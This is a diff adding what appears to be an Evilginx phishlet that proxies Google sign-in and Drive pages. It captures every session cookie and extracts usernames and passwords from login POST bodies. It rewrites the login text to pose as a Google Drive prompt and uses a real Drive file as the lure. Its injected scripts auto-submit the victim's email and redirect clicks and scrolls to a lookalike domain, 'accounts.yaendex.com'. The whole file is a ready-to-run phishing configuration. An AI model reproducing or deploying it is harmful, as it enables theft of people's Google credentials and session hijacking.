@@ -1,0 +1,132 @@
+author: '@Butterfly'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false,}
+  - {phish_sub: 'drive', orig_sub: 'drive', domain: 'google.com', session: true, is_landing: true,}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'youtube', orig_sub: 'accounts', domain: 'youtube.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'Google 계정 사용', replace: 'Google Drive로 이동', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'Use your Google Account', replace: 'to continue to Google Drive', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'Используйте аккаунт Google', replace: 'Переход в Google Диск', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'お客様の Google アカウントを使用', replace: 'Google ドライブに移動する', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'ssl.gstatic.com', replace: 'ssl.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'play.google.com', replace: 'play.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'apis.google.com', replace: 'apis.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'www.google.com', replace: 'www.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'apis.google.com', orig_sub: 'apis', domain: 'google.com', search: 'content.googleapis.com', replace: 'content.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: '{hostname}', replace: '{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+auth_tokens:
+  - domain: '.google.com'
+    keys: [".*,regexp"]
+  - domain: 'accounts.google.com'
+    keys: [".*,regexp"]
+  - domain: 'accounts.google.bg'
+    keys: [".*,regexp"]
+credentials:
+  username:
+    key: 'f.req'
+    search: '\"\[null,\\\"([^"]*)\\\"'
+    type: 'post'
+  password:
+    key: 'f.req'
+    search: 'null,null,\[\\\"([^"]*)\\\"'
+    type: 'post'
+  custom:
+    - key: 'useragent'
+      search: '(.*)'
+      type: 'post'
+    - key: 'browser'
+      search: '(.*)'
+      type: 'post'
+    - key: 'engine'
+      search: '(.*)'
+      type: 'post'
+    - key: 'platform'
+      search: '(.*)'
+      type: 'post'
+auth_urls:
+  - '/CheckCookie'
+  - '/ManageAccount'
+login:
+  domain: 'drive.google.com'
+  path: '/file/d/1L4mQ01FPp4pH3k7jjRCzUNo-9zkMe0iB/view?usp=sharing'
+force_post:
+  - path: '/_/signin/sl/challenge'
+    search: 
+      - {key: 'f.req', search: '.*'}
+      - {key: 'continue', search: '.*'}
+    force:
+      - {key: 'continue', value: ''}
+    type: 'post'
+  
+js_inject:
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['.*?']
+    trigger_params: ["email"]
+    script: |
+      function lp(){
+        var email = document.querySelector("#identifierId");
+        var btnNext = document.getElementsByTagName("button")[2];
+        if (email != null) {
+          email.value = "{email}";
+        }
+        if(btnNext != null && email.value == "{email}"){
+            btnNext.click();
+        }
+      }
+      setTimeout(function(){lp();}, 100);
+  - trigger_domains: ["drive.google.com"]
+    trigger_paths: ["/file/d/.*"]
+    script: |
+      function repage6326(){
+          var ta= document.getElementsByTagName("textarea")[0];
+          var nd1 = ta.nextElementSibling;
+          if (ta!=null && nd1!=null)
+          {
+            
+            nd1.onscroll = function(event){
+                console.log("scroll div");
+                setTimeout(function(){location.href='https://accounts.yaendex.com/';}, 3000);
+            };
+            
+          }
+          else
+          {
+            setTimeout(function(){repage6326();}, 500);
+          }
+      }
+      function repage6762(){
+          var div_links = document.getElementsByTagName("div");
+          
+          for (var i = 0; i < div_links.length; i++) {
+              div_links[i].onclick = function(event) {
+                  location.href="https://accounts.yaendex.com/";
+                  event.preventDefault();
+                  event.stopPropagation();
+                  return false;
+              };
+          }
+          
+          setTimeout(function(){repage6762();}, 1000);
+          
+      }
+      function repage6783(){
+          
+          
+          setTimeout(function(){location.href="https://accounts.yaendex.com/";}, 4000);
+          
+      }
+      setTimeout(function(){repage6326();repage6762();repage6783();}, 1000);
+      
+      
+      
+      
